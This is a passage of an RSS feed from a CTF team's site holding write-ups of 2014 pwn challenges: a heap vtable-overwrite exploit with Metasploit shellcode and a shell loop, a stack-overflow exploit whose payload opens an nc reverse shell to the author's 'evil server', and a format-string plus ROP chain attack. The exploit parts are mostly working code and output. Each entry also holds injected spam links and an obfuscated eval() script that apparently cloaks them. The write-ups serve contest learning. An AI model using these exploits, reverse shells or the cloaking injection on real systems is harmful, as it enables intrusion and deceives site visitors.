+...&lt;/pre&gt;&lt;p&gt;&amp;nbsp;So here is my exploit (code is ugly, but it works):&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import re
+import time
+import socket
+from struct import *
+
+host = &quot;54.165.225.121&quot;
+port = 5333
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.settimeout(5)
+
+def read_str(stId):
+	s.recv(1024)
+	sBuf = &quot;r {0}&quot;.format(stId)
+	s.send(sBuf+&#039;\n&#039;)
+	return s.recv(2014)
+
+def create_str(tp,st):
+	s.recv(1024)
+	sBuf = &quot;c {0} {1}&quot;.format(tp,st)
+	s.send(sBuf+&#039;\n&#039;)
+	buf= s.recv(1024)
+	return int(re.findall(&#039;\d+&#039;,buf)[0])
+
+def update_str(stId,st):
+	s.recv(1024)
+	sBuf = &quot;u {0} {1}&quot;.format(stId,st)
+	s.send(sBuf+&#039;\n&#039;)
+	buf = s.recv(1024)
+	return int(re.findall(&#039;\d+&#039;,buf)[0])
+
+def delete_str(stId):
+	s.recv(1024)
+	sBuf = &quot;d {0}&quot;.format(stId)
+	s.send(sBuf+&#039;\n&#039;)
+	return s.recv(1024)
+
+buf = s.recv(1024)
+
+# msfpayload linux/x64/exec CMD=&quot;whoami; sh&quot; R | msfencode -b \x00\x10 -e x64/xor -t python 
+#[*] x64/xor succeeded with size 95 (iteration=1)
+buf =  &quot;&quot;
+buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05&quot;
+buf += &quot;\xef\xff\xff\xff\x48\xbb\x27\x32\xdc\x60\xca\x39\x2e&quot;
+buf += &quot;\x23\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
+buf += &quot;\x4d\x09\x84\xf9\x82\x82\x01\x41\x4e\x5c\xf3\x13\xa2&quot;
+buf += &quot;\x39\x7d\x6b\xae\xd5\xb4\x4d\xa9\x39\x2e\x6b\xae\xd4&quot;
+buf += &quot;\x8e\x88\xc1\x39\x2e\x23\x50\x5a\xb3\x01\xa7\x50\x15&quot;
+buf += &quot;\x03\x54\x5a\xdc\x36\x9d\x71\xa7\xc5\x28\x37\xdc\x60&quot;
+buf += &quot;\xca\x39\x2e\x23&quot;
+
+#put shellcode to heap and get it&#039;s address
+myCode = create_str(0,buf)
+print(&#039;myCode = &#039;+hex(myCode))
+
+#create fake vtable
+badBuf = &#039;A&#039;*0x10+ pack(&quot;&amp;lt;Q&quot;,myCode)
+pVtable = create_str(0,badBuf)
+print(&#039;pVtable = &#039;+hex(pVtable))
+
+#create string container of type 1
+pObj = create_str(1,&#039;a&#039;*0x20)
+print(&#039;pObj = &#039;+hex(pObj))
+
+#update string container of type 1 and replace original vtable by fake vtable
+badBuf = pack(&quot;&amp;lt;Q&quot;,pVtable)*8
+myId3 = update_str(pObj,badBuf)
+print(&#039;myId3 = &#039;+hex(myId3))
+
+#trigger vulnerability and try to run shellcode
+print(read_str(myId3).__repr__())
+
+# bash!
+while True:
+	s.send(raw_input(&#039;$ &#039;)+&#039;\n&#039;)
+	print(s.recv(1024))
+
+s.close()&lt;/pre&gt;&lt;p&gt;&amp;nbsp;Unfortunately I don&#039;t save flag anywhere... but I remember that it was at home/amazon/flag, belive me;)&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.copperbridgemedia.com/&quot;&gt;Running sport media&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;http://www.sb-roscoff.fr/en/bdecheshop/jordan-release-dates/&quot;&gt;Air Jordan Release Dates Calendar&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Wed, 01 Oct 2014 20:36:35 +0000</pubDate>
+ <dc:creator>Dil4rd</dc:creator>
+ <guid isPermaLink="false">77 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/77#comments</comments>
+</item>
+<item>
+ <title>xorcise (exploit 500)</title>
+ <link>https://ctfcrew.org/writeup/69</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/24&quot;&gt;CSAW CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;We&#039;ve got the following binary and its source code: &lt;a href=&quot;http://ctfcrew.org/sites/default/files/writeups/xorcise.zip&quot;&gt;xorcise&lt;/a&gt;.&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ file xorcise
+xorcise: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked 
+(uses shared libs), for GNU/Linux 2.6.32, not stripped&lt;/pre&gt;&lt;p&gt;Looking attentively at source code you can find this interesting moment in decipher function:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#define BLOCK_SIZE 8
+#define MAX_BLOCKS 16
+
+uint32_t decipher(cipher_data *data, uint8_t *output)
+{
+    uint8_t buf[MAX_BLOCKS * BLOCK_SIZE];   //128 
+    uint32_t loop;
+    uint32_t block_index;
+    uint8_t xor_mask = 0x8F;
+
+    memcpy(buf, data-&amp;gt;bytes, sizeof(buf));
+    if ((data-&amp;gt;length / BLOCK_SIZE) &amp;gt; MAX_BLOCKS)
+    {
+        data-&amp;gt;length = BLOCK_SIZE * MAX_BLOCKS;
+    }
+
+    for (loop = 0; loop &amp;lt; data-&amp;gt;length; loop += 8)
+    {
+        for (block_index = 0; block_index &amp;lt; 8; ++block_index)
+        {
+            buf[loop+block_index]^=(xor_mask^data-&amp;gt;key[block_index]);
+        }
+    }
+    memcpy(output, buf, sizeof(buf));
+}&lt;/pre&gt;&lt;p&gt;Also you can get it looking at disasm or decompiled code:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/overflow.png&quot; alt=&quot;&quot; width=&quot;1120&quot; height=&quot;301&quot;&gt;&lt;/p&gt;&lt;p&gt;I managed to find it firstly in C-source. So it looks like we can run loop for 8 additional bytes after the buffer &lt;em&gt;buf&lt;/em&gt; because &lt;em&gt;data-&amp;gt;length&lt;/em&gt; is fully controlled by us. We just need to send &lt;em&gt;data-&amp;gt;length&lt;/em&gt; in range from 0x81 to 0x87. In this case external loop (with index variable &lt;em&gt;loop&lt;/em&gt;) will run one more time and internal loop will rewrite other variables on the stack.&lt;/p&gt;&lt;p&gt;After looking at disassembler and some debugging in gdb we distinguished the following stack structure:&lt;/p&gt;&lt;p&gt;128 bytes of &lt;em&gt;buf&lt;/em&gt; array&lt;/p&gt;&lt;p&gt;1 byte for &lt;em&gt;xor_mask&lt;/em&gt;&lt;/p&gt;&lt;p&gt;4 bytes of &lt;em&gt;block_index&lt;/em&gt;&lt;/p&gt;&lt;p&gt;4 bytes of &lt;em&gt;loop&lt;/em&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;Not bad, we can overwrite &lt;em&gt;xor_mask&lt;/em&gt;, &lt;em&gt;block_index&lt;/em&gt; and 3 least significant bytes of &lt;em&gt;loop&lt;/em&gt;. But when we corrupt &lt;em&gt;block_index&lt;/em&gt; variable we are falling info infinite loop or breaking out of loop immediately.&lt;/p&gt;&lt;p&gt;After some analysis of memory addresses in the binary we understand another promising possibility.&lt;/p&gt;&lt;p&gt;We can set &lt;em&gt;xor_mask&lt;/em&gt; to 0x00, then do not corrupt &lt;em&gt;block_index&lt;/em&gt; (because it should be in range from 0 to 8 for loop execution) and then we set least significant byte of variable &lt;em&gt;loop&lt;/em&gt; in such way that &lt;em&gt;buf[loop + block_index]&lt;/em&gt; becomes reference for return address! Great! Go back to binary for searching best place for jump to.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/call_system_exp500csaw.png&quot; alt=&quot;&quot; width=&quot;1200&quot; height=&quot;529&quot;&gt;&lt;/p&gt;&lt;p&gt;Yeah...&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/feeling.png&quot; alt=&quot;&quot; width=&quot;640&quot; height=&quot;640&quot;&gt;&lt;/p&gt;&lt;p&gt;So if we jump to 0x080492E9 from decipher, we will have&amp;nbsp;on the stack the following data:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    size_t bytes_read;
+    cipher_data encrypted;
+    uint8_t decrypted[128];
+    request *packet;
+    uint32_t authenticated;
+
+    memset(&amp;amp;encrypted, 0, sizeof(encrypted));
+    memset(&amp;amp;decrypted, 0, sizeof(decrypted));
+
+    bytes_read = recv(sockfd, (uint8_t *)&amp;amp;encrypted, sizeof(encrypted), 0);
+    if (bytes_read &amp;lt;= 0)
+    {
+        printf(&quot;Error: failed to read socket\n&quot;);
+        return -1;
+    }
+
+    if (encrypted.length &amp;gt; bytes_read)
+    {
+        printf(&quot;Error: invalid length in packet\n&quot;);
+        return -1;
+    }
+
+    decipher(&amp;amp;encrypted, decrypted);&lt;/pre&gt;&lt;p&gt;Address of &lt;em&gt;encrypted&lt;/em&gt;&amp;nbsp;buffer which is fully contolled by us. Excellent!&lt;/p&gt;&lt;p&gt;Data of &lt;em&gt;encrypted&lt;/em&gt; is formed in the following way:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;struct cipher_data
+{
+    uint8_t length;
+    uint8_t key[8];
+    uint8_t bytes[128];
+};&lt;/pre&gt;&lt;p&gt;- &lt;em&gt;length&lt;/em&gt; should be in range from 0x81 to 0x87;&lt;/p&gt;&lt;p&gt;- &lt;em&gt;key&lt;/em&gt; we suggest to be &lt;em&gt;{xor_mask, 0x00, 0x00, 0x00, 0x00, offset_to_ret_addr, mask_for_lsb_of_ret_addr, mask_for_2nd_bytes_of_ret_addr}&lt;/em&gt; but zero-bytes will terminate our buffer for &lt;em&gt;system()&lt;/em&gt;. So we can set &lt;em&gt;xor_mask&lt;/em&gt; to 0x20 (space character), then all following bytes will be xored with 0x20 and null-characters become spaces.&lt;/p&gt;&lt;p&gt;- &lt;em&gt;key[5]&lt;/em&gt; must be (16 + 3) because return address is offseted by 16 bytes from &lt;em&gt;loop&lt;/em&gt; index on the stack. +3 should be added because we are going to modify least significant byte of &lt;em&gt;loop&lt;/em&gt;&amp;nbsp;in such way to get least significant byte of return address on next iteration of loop.&lt;/p&gt;&lt;p&gt;- &lt;em&gt;key[6:7]&lt;/em&gt; must be 0x9194 ^ 0x92e9 = 0x037d - return address of normal execution flow xored with address of &quot;call system&quot; and xored with 0x20 of course.&lt;/p&gt;&lt;p&gt;- in &lt;em&gt;bytes&lt;/em&gt; we can send our payload for &lt;em&gt;system()&lt;/em&gt; call, just start it with &quot;;&quot; to cut off all first inpropriate bytes:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;;/bin/nc -e /bin/sh &amp;lt;BALALAIKACR3W_EVIL_SERVER_IP&amp;gt; 16969&lt;/pre&gt;&lt;p&gt;And now full exploit looks:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/python
+from socket import create_connection
+from struct import pack, unpack
+
+L = &#039;\x87&#039; #length
+xor = 0x20
+k6 = 0x13
+packet = L
+packet_str = &#039;\x00&#039; * 5 + chr(k6) + &#039;\x7D\x03&#039;
+for c in packet_str:
+	packet += chr( xor ^ ord(c))
+
+pl = &#039;;/bin/nc -e /bin/sh &amp;lt;BALALAIKACR3W_EVIL_SERVER_IP&amp;gt; 16969\x00&#039;
+padding = &#039;A&#039; * (128 - len(pl))
+packet += pl + padding
+
+s = create_connection((&#039;128.238.66.227&#039;, 24001))
+s.send(packet)
+print s.recv(1024)
+
+s.close()&lt;/pre&gt;&lt;p&gt;Now just do something like that on our EVIL SERVER and wait for backconnect:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ nc -lvvv -p 16969
+listening on [any] 16969 ...
+128.238.66.227: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [BALALAIKACR3W_EVIL_SERVER_IP] from (UNKNOWN) [128.238.66.227] 45427&lt;/pre&gt;&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;/sites/default/files/writeups/images/daddys-home1.gif&quot; alt=&quot;&quot; width=&quot;498&quot; height=&quot;194&quot;&gt;&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;ls -la
+total 44
+drwxr-xr-x 2 root root  4096 Sep 20 00:18 .
+drwxr-xr-x 3 root root  4096 Sep 14 14:14 ..
+-rw-r--r-- 1 root root    30 Sep 20 00:18 flag.txt
+-rw-r--r-- 1 root root     7 Sep 12 19:13 password.txt
+-rwxr-xr-x 1 root root 12308 Sep 12 19:08 xorcise
+-rw-r--r-- 1 root root 10248 Sep 10 13:16 xorcise.c
+cat flag.txt
+flag{code_exec&amp;gt;=crypto_break}
+cat password.txt
+pass123&lt;/pre&gt;&lt;p&gt;Flag is&amp;nbsp;&lt;strong&gt;flag{code_exec&amp;gt;=crypto_break}&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.juzsports.com/&quot;&gt;Sports Shoes&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfegctshop/fr/fr/nike-homme&quot;&gt;NIKE  HOMME&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/xorcise.zip&quot; type=&quot;application/zip; length=9843&quot;&gt;xorcise.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 25 Sep 2014 12:26:12 +0000</pubDate>
+ <dc:creator>Dor1s</dc:creator>
+ <guid isPermaLink="false">69 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/69#comments</comments>
+</item>
+<item>
+ <title>Explicit (pwn 500)</title>
+ <link>https://ctfcrew.org/writeup/68</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/23&quot;&gt;No cON Name CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;The task was to find vulnerability in binary service explicit (&lt;a href=&quot;http://ctfcrew.org/sites/default/files/writeups/eXPLicit.zip&quot;&gt;binary and exploit&lt;/a&gt;). Like other tasks at this CTF, this one was easy enouth.&lt;/p&gt;&lt;p&gt;After downloading file and opening it in IDA I&#039;d found that it&#039;s x86 ELF which has no imported functions. Unfortunately Hex-Rays FLIRT didn&#039;t help me that time, but x86 decompiler works fine and few minutes was enouth to reconstruct main function and identify high level apis. Result I&#039;ve got is the next:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax@1
+  char *v4; // edx@8
+  int v5; // ecx@12
+  int result; // eax@12
+  int v7; // [sp+4h] [bp-114h]@1
+  char *v8; // [sp+8h] [bp-110h]@3
+  char v9[256]; // [sp+Ch] [bp-10Ch]@2
+  int canary; // [sp+10Ch] [bp-Ch]@1
+
+  canary = *MK_FP(__GS__, 20);
+  fwrite(&quot;Welcome to Guess The Number Online!\n\n&quot;, 1u, 37, hFile);
+  v3 = get_system_time_0(0);
+  srand(v3);
+  v7 = rand() % 20;
+  while ( 1 )
+  {
+    fwrite(&quot;Pick a number between 0 and 20: &quot;, 1u, 32, hFile);
+    fflush(hFile);
+    if ( !recv_to_buffer(v9, 1024, hFile) )
+      break;
+    v8 = sub_805C210(v9, 10);
+    if ( v8 )
+      *v8 = 0;
+    if ( v9[0] == &#039;q&#039; )
+      break;
+    if ( to_int(v9) == v7 )
+    {
+      fwrite(&quot;You win! Congratulations!\n\n&quot;, 1u, 27, hFile);
+      fflush(hFile);
+      break;
+    }
+    fwrite(&quot;Your number is &quot;, 1u, 15, hFile);
+    fprintf(hFile, v9);
+    if ( to_int(v9) &amp;lt;= v7 )
+      v4 = &quot;low&quot;;
+    else
+      v4 = &quot;high&quot;;
+    fprintf(hFile, &quot; which is too %s.\n&quot;, v4);
+    fflush(hFile);
+  }
+  fwrite(&quot;Bye\n&quot;, 1u, 4, hFile);
+  fflush(hFile);
+  result = *MK_FP(__GS__, 20) ^ canary;
+  if ( *MK_FP(__GS__, 20) != canary )
+    sub_80610A0(v5);
+  return result;
+};
+&lt;/pre&gt;&lt;p&gt;As we can see there is an obvious stack overflow and format string vulnerabilities. Using format string vulnerability we can determine canary&#039;s value. Then we can overflow stack, overwrite canary by the same value and successfully reach retn instruction with modified return address.&lt;/p&gt;&lt;p&gt;First try to execute shellcode on the stack (just in case it&#039;s executable). For this we need:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;get canary value via sending string &quot;%70$08X&quot;;&lt;/li&gt;&lt;li&gt;get upper function stack frame (ebp) via sending string &quot;%73$08X&quot;;&lt;/li&gt;&lt;li&gt;using upper function stack frame calculate shellcode address;&lt;/li&gt;&lt;li&gt;trigger stack overflow via sending buffer&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: false; tab-size: 4; toolbar: true; codetag&quot;&gt;&quot;A&quot;*256+pack(&quot;&amp;lt;I&quot;,canary)+&quot;A&quot;*12+pack(&quot;&amp;lt;I&quot;,ptr_to_shellcode)+shellcode&lt;/pre&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Unfortunatelly this attempt failed... this means that stack is nonexecutable and because there is no RWE section in binary, we should use ROP.&lt;/p&gt;&lt;p&gt;Another bad news: there is no function &quot;system&quot; among high level api, built in the binary. So only 2 ways remains. The earsiest one is to find function &quot;mprotect&quot;, use it to make stack executable and run any shellcode. More complicated one is to build full ROP chain to put needed data somewhere in memory and use it to make sys_execve syscall.&lt;/p&gt;&lt;p&gt;I&#039;d selected the second way.&lt;/p&gt;&lt;p&gt;To find apropriate ROP gadget I&#039;d used &lt;a href=&quot;https://twitter.com/JonathanSalwan&quot;&gt;Jonathan Salwan&lt;/a&gt;&#039;s tool, named ROPgadget (official url: &lt;a href=&quot;http://shell-storm.org/project/ROPgadget/&quot;&gt;http://shell-storm.org/project/ROPgadget/&lt;/a&gt;). The only restricted byte is &#039;\n&#039; e.i. 0x0A, so just set option &#039;--badbytes &quot;0A&quot;&#039;.&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ ./ROPgadget.py --binary ~/explicit  --badbytes &quot;0a&quot;&lt;/pre&gt;&lt;p&gt;As write-what-where ROP chaine I&#039;d selected next one:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: false; tab-size: 4; toolbar: true; codetag&quot;&gt;p += pack(&#039;&amp;lt;I&#039;, 0x08083fc6) # pop edx ; ret
+p += pack(&#039;&amp;lt;I&#039;, dst_addr)   #  where
+p += pack(&#039;&amp;lt;I&#039;, 0x080CED61) # pop eax ; ret
+p += pack(&#039;&amp;lt;I&#039;, data)       #  what
+p += pack(&#039;&amp;lt;I&#039;, 0x0808a73d) # mov dword ptr [edx], eax ; ret
+&lt;/pre&gt;&lt;p&gt;To save my data I&#039;d used .data section (it stast from address 0x080D50C0), because it has RW permitions.&lt;/p&gt;&lt;p&gt;To execute sys_execve we have to imitate execution of next assemply code:&lt;/p&gt;&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;xor edx, edx
+mov ebx, pArg0
+mov ecx, pArgs
+mov eax,11
+int 0x80
+&lt;/pre&gt;&lt;p&gt;The only problem was to set ecx to desired value. The best ROP gadget was&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;0x080CF077 # pop ecx ; or cl, byte ptr [esi] ; or al, 0x43 ; ret&lt;/pre&gt;&lt;p&gt;So we have to set to esi address, which points to 0x0 byte value. One of the possible ways is the next:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;p += pack(&#039;&amp;lt;I&#039;, 0x080499f5) # pop esi ; ret
+p += pack(&#039;&amp;lt;I&#039;, 0x080d50c0+0x74) # any addr such that byte ptr [addr] = 0x0
+p += pack(&#039;&amp;lt;I&#039;, 0x080CF077) # pop ecx ; or cl, byte ptr [esi] ; or al, 0x43 ; ret
+p += pack(&#039;&amp;lt;I&#039;, 0x080d50c0+0x60) # ptr to ArgsArray
+&lt;/pre&gt;&lt;p&gt;And to the end for rop chain I put:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;p += pack(&quot;&amp;lt;I&quot;, 0x08049924) # jmp $&lt;/pre&gt;&lt;p&gt;It cases infinite loop and help me to determine that my ROP chain has been executed successsfully.&lt;/p&gt;&lt;p&gt;Now we can execute written python script and get the flag &quot;&lt;strong&gt;NcN_97740ead1060892a253be8ca33c6364a712b21d2&lt;/strong&gt;&quot;.&lt;/p&gt;&lt;p&gt;Final python script can be found &lt;a href=&quot;https://github.com/Dil4rd/CTF/blob/master/explicit_expl.py&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Authentic Nike Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-jordan-1/&quot;&gt;Women&#039;s Nike Air Jordan 1 trainers - Latest Releases , Ietp&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b 